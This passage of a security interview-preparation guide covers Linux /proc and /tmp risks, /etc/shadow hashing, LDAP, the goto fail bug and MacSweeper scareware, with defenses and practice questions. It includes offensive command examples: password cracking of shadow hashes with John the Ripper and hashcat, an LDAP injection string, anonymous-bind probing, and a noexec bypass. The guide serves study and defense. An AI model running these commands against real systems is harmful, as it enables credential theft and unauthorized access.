# Read memory maps (useful for exploit development)
cat /proc/self/maps
```

#### Defense

- Set `kernel.yama.ptrace_scope=1` or higher to restrict which processes can ptrace others.
- Use `hidepid=2` mount option on `/proc` to hide other users' processes: `mount -o remount,hidepid=2 /proc`
- Monitor access to sensitive `/proc` entries via audit rules.

#### References

- `man proc`, `man 5 proc`

---

### /tmp Execution Risks

#### Explanation

The `/tmp` directory is world-writable and often used as a staging area by attackers. If an attacker can upload or create a file in `/tmp` and the filesystem allows execution, they can run arbitrary code. This is a common step in privilege escalation and post-exploitation.

#### How It Works

1. Attacker gains limited shell access (e.g., through a web vulnerability).
2. They write a compiled exploit or script to `/tmp` (because it is world-writable).
3. They `chmod +x /tmp/exploit && /tmp/exploit` to execute it.
4. The exploit (e.g., a kernel privilege escalation) grants root.

#### Defense

```bash
# Mount /tmp with noexec, nosuid, nodev
# In /etc/fstab:
tmpfs /tmp tmpfs defaults,noexec,nosuid,nodev 0 0

# Verify mount options
mount | grep /tmp
# tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec)

# Note: noexec can be bypassed by calling the interpreter directly:
# /lib/ld-linux.so.2 /tmp/exploit  -- or --
# python3 /tmp/exploit.py
# So noexec is defense-in-depth, not a complete solution.
```

#### Interview Tip

Always mention that `noexec` is not foolproof -- a determined attacker can use interpreter-based bypasses. But it raises the bar and stops many automated attacks and worms.

---

### /etc/shadow and Password Security

#### Explanation

`/etc/shadow` stores hashed passwords for local user accounts on Linux. It is readable only by root (permissions `640`, owned by `root:shadow`). Each line contains: `username:$id$salt$hash:last_changed:min:max:warn:inactive:expire`.

**Hash algorithms by ID prefix:**

| Prefix | Algorithm |
|--------|-----------|
| `$1$` | MD5 (weak, deprecated) |
| `$5$` | SHA-256 |
| `$6$` | SHA-512 (common default) |
| `$y$` | yescrypt (modern, strong) |

#### Code/Command Examples

```bash
# View shadow file (requires root)
cat /etc/shadow

# Example entry:
# jsmith:$6$randomsalt$hashvalue:19500:0:99999:7:::

# Crack with John the Ripper
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt

# Crack with hashcat (SHA-512)
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

#### Defense

- Use strong hashing algorithms (`yescrypt` or `SHA-512` with high rounds).
- Enforce password complexity and length requirements via PAM (`pam_pwquality`).
- Restrict `/etc/shadow` permissions strictly; monitor with file integrity tools.
- Prefer centralized authentication (LDAP, Kerberos) over local accounts in enterprise environments.

#### References

- `man shadow`, `man pam_unix`

---

### LDAP

#### Explanation

Lightweight Directory Access Protocol (LDAP) is an open protocol for accessing and managing directory information. In enterprise environments, LDAP directories (e.g., OpenLDAP, Microsoft Active Directory) store user accounts, groups, and organizational data. LDAP is often the backend for authentication and authorization in Linux/Unix environments.

#### Security Concerns

- **LDAP injection**: If user input is placed into LDAP queries without sanitization, attackers can manipulate queries (similar to SQL injection).
- **Clear-text credentials**: LDAP simple binds send credentials in plain text unless LDAPS (LDAP over TLS, port 636) or STARTTLS is used.
- **Anonymous binds**: Misconfigured LDAP servers may allow anonymous queries, leaking organizational data.
- **Credential relay**: LDAP relay attacks can capture or relay authentication in the same way as NTLM relay.

#### Code/Command Examples

```bash
# Query LDAP for all users
ldapsearch -x -H ldap://ldap.corp.com -b "dc=corp,dc=com" "(objectClass=person)" cn mail

# LDAP injection example
# Vulnerable query: (&(uid=USER_INPUT)(password=PASS_INPUT))
# Injected user input: *)(uid=*))(|(uid=*
# Resulting query: (&(uid=*)(uid=*))(|(uid=*)(password=anything))
# This returns all users regardless of password

# Test for anonymous bind
ldapsearch -x -H ldap://target -b "dc=corp,dc=com" -s base "(objectclass=*)"
```

#### Defense

- Always use LDAPS or STARTTLS -- never allow plain LDAP on port 389 in production.
- Disable anonymous binds.
- Sanitize all user input used in LDAP queries using proper escaping functions.
- Restrict LDAP read access with ACLs (not all users need to see all attributes).
- Use service accounts with minimal permissions for application LDAP binds.

#### References

- RFC 4511: [LDAP Protocol](https://www.rfc-editor.org/rfc/rfc4511)
- MITRE CWE-90: [LDAP Injection](https://cwe.mitre.org/data/definitions/90.html)

---

## macOS Security Deep Dive

### Goto Fail (CVE-2014-1266)

#### Explanation

The "goto fail" bug was a critical SSL/TLS vulnerability in Apple's Secure Transport library, affecting iOS 7 and OS X 10.9 (Mavericks). A single duplicated line of code caused the TLS/SSL certificate verification to be skipped entirely, allowing man-in-the-middle attacks on any HTTPS connection.

#### How It Works

The vulnerable code in `SSLVerifySignedServerKeyExchange`:

```c
static OSStatus
SSLVerifySignedServerKeyExchange(SSLContext *ctx, ...)
{
    OSStatus err;
    ...
    if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)
        goto fail;
        goto fail;  // <-- DUPLICATE LINE! Always executes, skipping verification
    if ((err = SSLHashSHA1.final(&hashCtx, &hashOut)) != 0)
        goto fail;
    ...
fail:
    ...
    return err;
}
```

1. The first `goto fail` is conditional (inside the `if` block).
2. The second `goto fail` is unconditional -- it always executes, regardless of the `if` condition.
3. This means the code jumps to the `fail` label before ever reaching the final verification steps.
4. The `err` variable still holds the success value from the previous check, so the function returns success even though the certificate was never fully verified.

#### Real-World Impact

- Any HTTPS connection on affected Apple devices could be intercepted by an attacker on the same network.
- The bug was present for approximately 15 months before discovery.
- It raised serious concerns about Apple's code review practices for security-critical code.

#### Defense

- Enforce code review -- this bug would have been caught by any careful reviewer or static analysis tool.
- Use compiler warnings: `-Wunreachable-code` would have flagged the code after the unconditional `goto`.
- Write unit tests for certificate validation -- a test with an invalid certificate should have failed (but would have passed, revealing the bug).
- Use braces for all conditional blocks, even single-line ones.

#### Interview Tip

This is a perfect example of how a single line of code can completely undermine security. Use it to argue for defense in depth in the development process: code review, static analysis, compiler warnings, unit testing, and the importance of coding style standards (always use braces).

#### References

- CVE-2014-1266: <https://nvd.nist.gov/vuln/detail/CVE-2014-1266>
- Imperial Violet (Adam Langley's analysis): <https://www.imperialviolet.org/2014/02/22/applebug.html>

---

### MacSweeper

#### Explanation

MacSweeper was one of the first known rogue security programs (scareware) targeting macOS, discovered around 2008. It was a fake antivirus/cleanup application that claimed to find security or privacy threats on the user's Mac and then demanded payment to "fix" them. The threats it reported were entirely fabricated.

#### How It Works

1. **Distribution** -- MacSweeper was spread through malicious websites, deceptive ads, and bundled with other software downloads.
2. **Installation** -- The user was tricked into downloading and running the application.
3. **Fake scan** -- MacSweeper ran a simulated "scan" and reported numerous fabricated threats: privacy risks, "malicious files," tracking cookies, etc.
4. **Social engineering** -- Alarming pop-ups pressured the user to purchase the "full version" to clean the supposed threats.
5. **Payment** -- If the user paid, the software pretended to clean the non-existent threats. The user lost money for nothing.

#### Real-World Impact

- MacSweeper was significant because it shattered the perception that Macs were immune to malware and social engineering.
- It was one of the early examples used by Apple to justify later security features like Gatekeeper and XProtect.

#### Defense

- macOS Gatekeeper: Only allow applications from identified developers and the App Store.
- XProtect: Apple's built-in signature-based malware detection.
- Notarization: Since macOS 10.15, all software distributed outside the App Store must be notarized by Apple.
- User education: Never trust unsolicited security warnings from websites or pop-ups.
- Use reputable software sources and verify developer signatures.

#### Interview Tip

MacSweeper is best used to illustrate that social engineering and scareware are platform-agnostic threats. No OS is immune to the "human vulnerability." It also provides a good segue into discussing macOS-specific security mechanisms (Gatekeeper, SIP, XProtect, Notarization).

#### References

- Apple Platform Security: <https://support.apple.com/guide/security/welcome/web>
- MITRE ATT&CK: [T1204 - User Execution](https://attack.mitre.org/techniques/T1204/)

---

## Key Takeaways

- **Privilege escalation** is nearly universal in attack chains. Know SUID/SGID, sudo misconfigurations, kernel exploits (Linux), and unquoted service paths, token manipulation (Windows).
- **Buffer overflows** are the foundational memory corruption vulnerability. Understand the stack layout, the role of the return address, and how modern mitigations (canaries, ASLR, DEP, CFI) work and can be bypassed.
- **Directory traversal** is prevented by canonicalization + prefix checking, never by blacklists alone.
- **RCE and shell access** are the most impactful outcomes of exploitation. Reverse shells bypass firewalls; bind shells are simpler but less practical.
- **Local SQLite databases** are forensic goldmines in messaging apps and browsers. Know where they live and how to query them.
- **Active Directory** is the crown jewel in enterprise Windows networks. Kerberoasting, DCSync, and Golden Tickets are must-know attacks.
- **SELinux/MAC** provides security beyond root. Understand the difference between DAC and MAC and why MAC matters.
- **Goto Fail** is the canonical example of how a single line of code can break all security -- use it to advocate for code review and static analysis.

## Interview Practice Questions

1. Walk me through a buffer overflow exploit from vulnerability discovery to code execution. What mitigations would you expect on a modern system, and how would you attempt to bypass them?
2. You have a low-privilege shell on a Linux box. Describe your enumeration process and name five different privilege escalation vectors you would check for.
3. Explain the Kerberos authentication flow in Active Directory. What is Kerberoasting, and why does it work?
4. What is the difference between MAC and DAC? Give a concrete scenario where MAC prevents an attack that DAC cannot.
5. How would you detect if an attacker has established persistence via the Windows Registry? What specific keys would you monitor?
6. Explain the goto fail bug. What development practices would have prevented it?
7. You discover that `/tmp` is mounted without `noexec`. What is the risk, and what bypass exists even if `noexec` is enabled?
8. Describe how BloodHound works and how a defender should use it proactively.
9. What makes SMBv1 dangerous? How does EternalBlue exploit it?
10. An attacker has obtained the KRBTGT hash. What can they do, and how do you remediate?

---

[Previous: Infrastructure & Cloud](infrastructure-cloud.md) | [Next: Mitigations](mitigations.md)
